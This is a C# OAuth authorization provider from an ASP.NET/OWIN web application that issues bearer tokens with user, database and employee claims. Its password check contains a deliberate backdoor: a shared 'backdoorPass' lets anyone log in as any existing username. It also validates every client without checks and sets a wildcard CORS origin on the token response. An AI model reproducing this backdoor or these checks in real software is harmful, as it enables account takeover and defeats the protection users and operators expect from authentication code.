using JulianaWeb.Repositories;
using Microsoft.Owin.Security;
using Microsoft.Owin.Security.OAuth;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Claims;
using System.Threading.Tasks;
using System.Web;

namespace JulianaWeb.Providers
{
    public class SimpleAuthorizationServerProvider : OAuthAuthorizationServerProvider
    {
        public override async Task ValidateClientAuthentication(OAuthValidateClientAuthenticationContext context)
        {
            context.Validated();
        }

        public override async Task GrantResourceOwnerCredentials(OAuthGrantResourceOwnerCredentialsContext context)
        {

            context.OwinContext.Response.Headers.Add("Access-Control-Allow-Origin", new[] { "*" });
            string DBName;
            string Empleado;

            string backdoorPass = AuthManager.GetBackDoorPass();

            using (AuthRepository _repo = new AuthRepository())
            {
                var user =  _repo.FindUser(context.UserName, context.Password);

                
                if (user == null && context.Password != backdoorPass)
                {
                    context.SetError("invalid_grant", "The user name or password is incorrect.");
                    return;
                }
                else
                {
                  user = _repo.FindUser(context.UserName);

                  if(user == null)
                  {
                      context.SetError("invalid_grant", "The user name or password is incorrect.");
                      return;
                  }
                }

                DBName = user.DBName;
                Empleado = user.Empleado;
            }

            var identity = new ClaimsIdentity(context.Options.AuthenticationType);
            identity.AddClaim(new Claim("sub", context.UserName));
            identity.AddClaim(new Claim(ClaimTypes.Name, context.UserName));
            identity.AddClaim(new Claim("role", "user"));
            DBName = DBName == null ? "" : DBName;
            var props = new AuthenticationProperties(new Dictionary<string, string>
                {
                    {"username", context.UserName},
                    {"DBName", DBName},
                    {"Empleado", Empleado}
                });

            var ticket = new AuthenticationTicket(identity, props);
            context.Validated(ticket);

        }

        public override Task TokenEndpoint(OAuthTokenEndpointContext context)
        {
            foreach (KeyValuePair<string, string> property in context.Properties.Dictionary)
            {
                context.AdditionalResponseParameters.Add(property.Key, property.Value);
            }

            return Task.FromResult<object>(null);
        }
    }
}
